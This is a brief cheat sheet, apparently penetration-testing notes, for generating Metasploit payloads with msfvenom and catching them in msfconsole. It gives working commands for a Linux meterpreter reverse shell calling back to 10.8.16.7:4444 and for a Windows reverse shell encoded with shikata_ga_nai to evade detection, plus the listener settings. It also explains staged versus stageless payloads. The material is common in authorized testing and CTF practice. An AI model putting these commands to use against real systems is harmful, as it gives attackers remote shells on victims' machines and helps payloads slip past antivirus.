https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
##### Standard usage
`msfvenom -a ARCH -p PAYLOAD -e ENCODER -f FORMAT -o OUTPUT LHOST=IP LPORT=PORT`

##### Important formats
Windows: `dll, exe, exe-service, powershell, msi`
Linux: `elf, bash`
Misc: `python, ruby `

##### Useful encoders
Windows: `x86/shikata_ga_nai, x86/opt_sub`

###### Important payloads
Windows: ``
Linux: 

```
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.8.16.7 LPORT=4444 // Generate a staged ELF meterpreter reverse shell
```
##### Windows
```
msfvenom -a ARCH -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -f EXE -o winshell.exe LHOST=IP LPORT=PORT
```

##### Staged vs stageless
Staged payloads: Small bit of code that connects to the attacker, then downloads an actual payload to the RAM.
Example: `windows/shell/reverse_tcp`

Stageless payloads: Full payload, connects to listener when executed.
Example: `windows/shell_reverse_tcp

##### MSFConsole:
```
set payload METERPRETER_PAYLOAD  // meterpreter/ payloads
set LHOST 0.0.0.0
set LPORT 4444
run -j  // Run in background
```